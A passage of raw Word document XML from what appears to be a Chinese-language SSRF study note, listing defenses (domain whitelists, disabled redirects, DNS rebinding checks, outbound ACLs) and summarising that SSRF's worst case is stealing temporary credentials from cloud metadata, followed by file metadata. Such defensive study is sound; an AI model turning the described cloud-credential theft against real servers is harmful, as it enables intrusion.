      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>白名单：只允许特定域名（最安全）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34207218" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>禁用重定向：</w:t>
      </w:r>
      <w:r>
        <w:t>CURLOPT_FOLLOWLOCATION</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>=false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC5CF38" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">DNS </w:t>
      </w:r>
      <w:r>
        <w:t>二次校验：防止</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> DNS Rebinding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EAB82A4" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:pStyle w:val="a0"/>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>网络层</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ACL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>：出站流量限制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>最小权限</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24BFAB9D" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="002E49D8">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68277E4C" w14:textId="77777777" w:rsidR="002E49D8" w:rsidRDefault="00951A4C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">[!] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>一句话总结：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve">SSRF = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>利用服务器做跳板攻击内网</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>本机</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云服务。防御</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>协议限制</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> + IP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>黑名单</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>出站</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> ACL </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>三层防御。最危险场景</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>云</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t xml:space="preserve"> Metadata </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="CC3300"/>
          <w:lang w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>获取临时凭据。</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="002E49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F123B2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2B1E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9D8"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00951A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726B7"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{00A0EA77-775F-4078-8262-9E0A756C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951A4C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HTML">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="a2"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00951A4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8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14</Pages>
  <Words>3276</Words>
  <Characters>6585</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>274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梁 张</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-09T05:24:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>